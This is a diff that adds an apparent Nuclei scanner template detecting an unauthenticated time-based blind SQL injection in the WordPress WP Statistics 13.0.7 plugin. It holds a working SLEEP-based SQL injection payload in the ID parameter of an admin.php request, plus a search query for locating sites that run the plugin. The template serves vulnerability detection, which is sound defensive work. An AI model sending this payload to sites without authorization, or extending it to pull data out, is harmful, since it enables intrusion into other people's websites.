@@ -1,0 +1,46 @@
+id: wp-statistics-sqli
+
+info:
+  name: WordPress WP Statistics Plugin 13.0.7 - SQL Injection
+  author: r3Y3r53
+  severity: high
+  description: |
+    WordPress Plugin WP Statistics 13.0.7  contains an unauthenticated Time based SQL injection vulnerability. The plugin does not sanitize and escape the id parameter before using it in a SQL statement, leading to an unauthenticated blind SQL injection. An attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.
+  reference:
+    - https://www.exploit-db.com/exploits/49894
+    - https://www.acunetix.com/vulnerabilities/web/wordpress-plugin-wp-statistics-sql-injection-13-0-7/
+    - https://www.wordfence.com/blog/2021/05/over-600000-sites-impacted-by-wp-statistics-patch/
+    - https://wordpress.org/plugins/wp-statistics/
+  metadata:
+    verified: true
+    max-request: 2
+    publicwww-query: /wp-content/plugins/wp-statistics/
+  tags: sqli,unauth,exploitdb,wp-statistics,wp-plugin,wordpress,wp
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /wp-content/plugins/wp-statistics/readme.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        words:
+          - 'WP Statistics'
+        internal: true
+
+  - raw:
+      - |
+        @timeout: 20s
+        GET /wp-admin/admin.php?page=wps_pages_page&type=1&ID=1+AND+(SELECT+*+from+(select+SLEEP(6))a) HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=6'
+          - 'status_code == 500'
+        condition: and
+# digest: 490a0046304402207ddca08142915363e9410129de63cd4dec2f952c6533ac90242e302b8b04002e02207cc6810c8ca39fc90e82f7419ce5a9ff8f48a48ade72f110dddae015746500d3:922c64590222798bb761d5b6d8e72950
